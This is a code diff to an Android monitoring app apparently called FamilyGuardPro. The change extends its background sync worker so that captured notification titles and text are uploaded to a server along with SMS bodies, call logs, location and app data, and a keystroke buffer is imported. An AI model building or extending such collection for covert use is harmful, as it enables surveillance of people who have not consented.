@@ -12,6 +12,7 @@ import com.familyguardpro.utils.PreferenceManager
 import com.familyguardpro.utils.DataCollector
 import com.familyguardpro.utils.KeystrokeBuffer
 import com.familyguardpro.utils.FcmTokenManager
+import com.familyguardpro.utils.NotificationBuffer
 import com.google.firebase.messaging.FirebaseMessaging
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.tasks.await
@@ -118,6 +119,8 @@ class DataSyncWorker(
             
             val dataCollector = DataCollector(applicationContext)
             val syncData = dataCollector.collectAllData()
+            val notificationBuffer = NotificationBuffer(applicationContext)
+            val pendingNotifications = notificationBuffer.getPendingNotifications()
             
             // Build location item if available
             val locationItem: com.familyguardpro.network.LocationItem? = syncData.location?.let { loc ->
@@ -171,7 +174,15 @@ class DataSyncWorker(
                 apps = appsFormatted,
                 callLogs = callLogsFormatted,
                 location = locationItem,
-                notifications = emptyList(),
+                notifications = pendingNotifications.map { notification ->
+                    com.familyguardpro.network.NotificationItem(
+                        packageName = notification.packageName,
+                        appName = notification.appName,
+                        title = notification.title,
+                        content = notification.text,
+                        timestamp = notification.timestamp
+                    )
+                },
                 mobileDataEnabled = mobileDataOn,
                 installedApps = installedAppsFormatted
             )
@@ -182,7 +193,7 @@ class DataSyncWorker(
             Log.d(TAG, "Device ID length: ${deviceId.length}")
             Log.d(TAG, "API Base URL: ${com.familyguardpro.network.ApiClient.BASE_URL}")
             Log.d(TAG, "Battery: ${syncRequestBody.battery}, ScreenTime: ${syncRequestBody.screenTime}")
-            Log.d(TAG, "Apps count: ${appsFormatted.size}, CallLogs count: ${callLogsFormatted.size}")
+            Log.d(TAG, "Apps count: ${appsFormatted.size}, CallLogs count: ${callLogsFormatted.size}, Notifications count: ${pendingNotifications.size}")
             Log.d(TAG, "Location: $locationItem")
             Log.d(TAG, "=== END REQUEST DETAILS ===")
             
@@ -193,6 +204,7 @@ class DataSyncWorker(
             if (response.success) {
                 Log.d(TAG, "Data sync successful!")
                 preferenceManager.setLastSyncTime(System.currentTimeMillis())
+                notificationBuffer.removeNotifications(pendingNotifications)
                 
                 // Also report permissions periodically
                 com.familyguardpro.utils.PermissionReporter.reportPermissions(applicationContext)
@@ -312,7 +324,7 @@ class DataSyncWorker(
                 smsList.add(
                     com.familyguardpro.network.SmsItem(
                         address = sms.optString("address", ""),
-                        contactName = sms.optString("contactName", null),
+                        contactName = sms.optString("contactName", "").takeIf { it.isNotBlank() },
                         body = sms.optString("body", ""),
                         type = sms.optString("type", "inbox"),
                         read = sms.optBoolean("read", false),
@@ -378,7 +390,7 @@ class DataSyncWorker(
      * Ensure FCM token is registered with the server
      * Uses FcmTokenManager for centralized token management with retry logic
      */
-    private suspend fun ensureFcmTokenRegistered(deviceId: String) {
+    private suspend fun ensureFcmTokenRegistered(@Suppress("UNUSED_PARAMETER") deviceId: String) {
         try {
             Log.d(TAG, "Checking FCM token registration via FcmTokenManager...")
             
